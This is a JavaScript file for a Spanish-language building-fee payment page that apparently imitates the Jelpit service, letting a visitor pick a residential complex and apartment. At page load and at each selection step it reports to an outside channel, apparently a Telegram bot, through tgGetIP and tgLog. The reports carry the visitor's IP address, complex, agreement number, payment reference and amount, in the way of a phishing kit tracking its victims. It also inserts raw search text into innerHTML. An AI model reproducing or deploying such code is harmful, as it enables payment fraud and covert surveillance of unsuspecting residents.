/* ── Log: entrada a index.php ──────────────────────────── */
tgGetIP().then(ip => tgLog([
  '🟢 <b>NUEVA VISITA</b>',
  `📄 Página: Buscar conjunto (index.php)`,
  `🌐 IP: <code>${ip}</code>`,
  `🕐 ${new Date().toLocaleString('es-CO')}`
]));

/* ── State ──────────────────────────────────────────────── */
let aptData = [];
let selConj   = null;
let selApt    = null;

/* ── Elements ───────────────────────────────────────────── */
const searchInputGroup   = document.getElementById('searchInputGroup');
const searchInput        = document.getElementById('searchInput');
const searchDropdown     = document.getElementById('searchDropdown');
const searchResults      = document.getElementById('searchResultsContainer');
const searchClearBtn     = document.getElementById('searchClearBtn');
const searchBuildingIcon = document.getElementById('searchBuildingIcon');
const conjuntoLabel      = document.getElementById('conjuntoLabel');

const aptInputGroup = document.getElementById('aptInputGroup');
const aptInput      = document.getElementById('aptInput');
const aptDropdown   = document.getElementById('aptDropdown');
const aptResults    = document.getElementById('aptResultsContainer');
const aptLabel      = document.getElementById('aptLabel');

const btnContinuar = document.getElementById('btnContinuar');
const loader       = document.getElementById('pagarAdminLoader');

/* ── Restaurar conjunto al volver de "Cambiar referencia" ── */
if (sessionStorage.getItem('jelpit_keep_conj')) {
  sessionStorage.removeItem('jelpit_keep_conj');
  const saved = JSON.parse(sessionStorage.getItem('jelpit_conj') || 'null');
  if (saved) pickConjunto(saved);
}

/* ── Debounce helper ────────────────────────────────────── */
let _searchTimer = null;
function debounce(fn, ms) {
  clearTimeout(_searchTimer);
  _searchTimer = setTimeout(fn, ms);
}

/* ── Helpers ────────────────────────────────────────────── */
function hl(text, q) {
  if (!q || !text) return text || '';
  const i = text.toLowerCase().indexOf(q.toLowerCase());
  if (i < 0) return text;
  return text.slice(0, i)
    + `<strong style="color:#2e0063">${text.slice(i, i + q.length)}</strong>`
    + text.slice(i + q.length);
}

function setLabel(label, active) {
  if (!label) return;
  if (active) label.classList.add('active');
  else        label.classList.remove('active');
}

function show(el) { if (el) el.style.display = 'block'; }
function hide(el) { if (el) el.style.display = 'none'; }

function updateBtn() {
  const ok = !!(selConj && selApt);
  btnContinuar && btnContinuar.classList.toggle('active', ok);
  if (btnContinuar) btnContinuar.disabled = !ok;
}

function showLoader(yes) {
  if (!loader) return;
  loader.classList.toggle('is-visible', yes);
  loader.setAttribute('aria-busy', String(yes));
}

function setDisabled(yes) {
  if (!aptInput) return;
  aptInput.disabled = yes;
  aptInput.classList.toggle('soft-bg', yes);
  aptInputGroup && aptInputGroup.classList.toggle('is-disabled', yes);
}

/* ── Conjunto: events ───────────────────────────────────── */
searchInput && searchInput.addEventListener('focus', () => {
  setLabel(conjuntoLabel, true);
  if (selConj) { searchInput.select(); return; }
  if (searchInput.value.trim().length >= 2) renderConjuntos(searchInput.value);
});

searchInput && searchInput.addEventListener('blur', () => {
  if (!searchInput.value) setLabel(conjuntoLabel, false);
  setTimeout(() => hide(searchDropdown), 200);
});

searchInput && searchInput.addEventListener('input', () => {
  const q = searchInput.value.trim();
  if (selConj) { selConj = null; resetApt(); updateBtn(); }

  searchClearBtn && (searchClearBtn.style.display    = q ? 'block' : 'none');
  searchBuildingIcon && (searchBuildingIcon.style.display = q ? 'none'  : 'block');

  if (q.length < 2) { hide(searchDropdown); return; }
  renderConjuntos(q);
});

searchClearBtn && searchClearBtn.addEventListener('click', () => {
  searchInput.value = '';
  selConj = null;
  searchClearBtn.style.display = 'none';
  searchBuildingIcon && (searchBuildingIcon.style.display = 'block');
  setLabel(conjuntoLabel, false);
  hide(searchDropdown);
  resetApt();
  updateBtn();
  searchInput.focus();
});

function renderConjuntos(q) {
  if (q.length < 2) { hide(searchDropdown); return; }

  searchResults.innerHTML = '<div class="dd-loading"><div class="dd-spinner"></div> Buscando...</div>';
  show(searchDropdown);

  debounce(() => {
    fetch(`api.php?action=conjuntos&q=${encodeURIComponent(q)}`)
      .then(r => r.json())
      .then(res => {
        if (!res.length) {
          searchResults.innerHTML = `<div class="dd-empty">Sin resultados para "<b>${q}</b>"</div>`;
          return;
        }
        searchResults.innerHTML = res.map(c => `
          <div class="dropdown-item" data-id="${c._id}">
            <div class="item-line">
              <div class="item-icon icon-purple"><i class="fa-regular fa-building"></i></div>
              <div class="item-text item-title">${hl(c.co_ownership_name || '', q)}</div>
            </div>
            <div class="item-line">
              <div class="item-icon icon-gray"><i class="fa-solid fa-location-dot"></i></div>
              <div class="item-text">${hl(c.address || '', q)}, <strong>${hl(c.city || '', q)} - ${c.department || ''}</strong></div>
            </div>
            <div class="item-line">
              <div class="item-icon icon-purple"><i class="fa-regular fa-calendar-days"></i></div>
              <div class="item-text"><strong>Convenio:</strong> ${c.agreement_number || ''}</div>
            </div>
          </div>`).join('');

        searchResults.querySelectorAll('.dropdown-item').forEach(el => {
          el.addEventListener('mousedown', e => {
            e.preventDefault();
            const c = res.find(x => x._id === el.dataset.id);
            if (c) pickConjunto(c);
          });
        });
      })
      .catch(() => {
        searchResults.innerHTML = '<div class="dd-empty">Error al buscar. Intenta de nuevo.</div>';
      });
  }, 300);
}

function pickConjunto(c) {
  selConj = c;
  const addr = [c.address, c.city].filter(Boolean).join(' - ');
  searchInput.value = addr ? `${c.co_ownership_name}, ${addr}` : c.co_ownership_name;
  setLabel(conjuntoLabel, true);
  searchClearBtn && (searchClearBtn.style.display    = 'block');
  searchBuildingIcon && (searchBuildingIcon.style.display = 'none');
  hide(searchDropdown);
  loadApts(c._id);
  updateBtn();

  tgGetIP().then(ip => tgLog([
    '🏢 <b>CONJUNTO SELECCIONADO</b>',
    `🏘️ Nombre: <b>${c.co_ownership_name}</b>`,
    `📍 Dirección: ${c.address || '—'}, ${c.city || '—'}`,
    `🔑 Convenio: ${c.agreement_number || '—'}`,
    `🌐 IP: <code>${ip}</code>`,
    `🕐 ${new Date().toLocaleString('es-CO')}`
  ]));
}

/* ── Apartments ─────────────────────────────────────────── */
function resetApt() {
  selApt = null;
  aptData = [];
  if (aptInput) aptInput.value = '';
  setLabel(aptLabel, false);
  setDisabled(true);
  hide(aptDropdown);
}

function loadApts(id) {
  setDisabled(true);
  aptResults.innerHTML = '<div class="dd-loading"><div class="dd-spinner"></div> Cargando apartamentos...</div>';
  show(aptDropdown);

  fetch(`api.php?action=apartamentos&id=${id}`)
    .then(r => r.json())
    .then(data => {
      aptData = data.apartamentos || [];
      setDisabled(false);
      hide(aptDropdown);
      aptInput && aptInput.focus();
    })
    .catch(() => {
      aptResults.innerHTML = '<div class="dd-empty">Error cargando los apartamentos.</div>';
      setDisabled(false);
    });
}

aptInput && aptInput.addEventListener('focus', () => {
  setLabel(aptLabel, true);
  if (selApt) { aptInput.select(); return; }
  renderApts(aptInput.value);
});

aptInput && aptInput.addEventListener('blur', () => {
  if (!aptInput.value) setLabel(aptLabel, false);
  setTimeout(() => hide(aptDropdown), 200);
});

aptInput && aptInput.addEventListener('input', () => {
  if (selApt) { selApt = null; updateBtn(); }
  renderApts(aptInput.value);
});

function renderApts(q) {
  const ql = q.trim().toLowerCase();
  const res = aptData.filter(a =>
    !ql ||
    a.inmueble?.toLowerCase().includes(ql) ||
    a.referencia?.toLowerCase().includes(ql)
  ).slice(0, 20);

  if (!res.length) {
    aptResults.innerHTML = '<div class="dd-empty">Sin resultados</div>';
    show(aptDropdown);
    return;
  }

  aptResults.innerHTML = res.map(a => `
    <div class="dropdown-item" data-i="${a.inmueble}" data-r="${a.referencia}" data-t="${a.tipo}" data-p="${a.precio}">
      <div style="font-size:14px;color:#4b4b4b;padding-bottom:3px;">
        Inmueble <strong style="color:#2e0063">${hl(a.inmueble || '', q)}</strong>
        - ${a.tipo || 'INMUEBLE'} <strong style="color:#2e0063">${hl(a.inmueble || '', q)}</strong>
      </div>
      <div style="font-size:13px;color:#888;">
        Referencia <strong style="color:#2e0063">${hl(a.referencia || '', q)}</strong>
      </div>
    </div>`).join('');

  show(aptDropdown);

  aptResults.querySelectorAll('.dropdown-item').forEach(el => {
    el.addEventListener('mousedown', e => {
      e.preventDefault();
      pickApt({ inmueble: el.dataset.i, referencia: el.dataset.r, tipo: el.dataset.t, precio: el.dataset.p });
    });
  });
}

function pickApt(apt) {
  selApt = apt;
  if (aptInput) {
    aptInput.value = `${apt.tipo || 'INMUEBLE'} ${apt.inmueble}  ·  Referencia de pago: ${apt.referencia}`;
  }
  setLabel(aptLabel, true);
  hide(aptDropdown);
  updateBtn();

  tgLog([
    '🏠 <b>APARTAMENTO SELECCIONADO</b>',
    `🏘️ Conjunto: <b>${selConj?.co_ownership_name || '—'}</b>`,
    `🚪 Inmueble: ${apt.tipo || 'INMUEBLE'} ${apt.inmueble}`,
    `🔖 Referencia: ${apt.referencia}`,
    `💰 Valor: $${Number(apt.precio).toLocaleString('es-CO')}`,
    `🕐 ${new Date().toLocaleString('es-CO')}`
  ]);
}

/* ── Continue ───────────────────────────────────────────── */
btnContinuar && btnContinuar.addEventListener('click', () => {
  if (!selConj || !selApt) return;
  sessionStorage.setItem('jelpit_conj', JSON.stringify(selConj));
  sessionStorage.setItem('jelpit_apt',  JSON.stringify(selApt));
  window.location.href = 'verificar.php';
});

/* ── Close on outside click ─────────────────────────────── */
document.addEventListener('click', e => {
  if (searchInputGroup && !searchInputGroup.contains(e.target)) hide(searchDropdown);
  if (aptInputGroup    && !aptInputGroup.contains(e.target))    hide(aptDropdown);
});
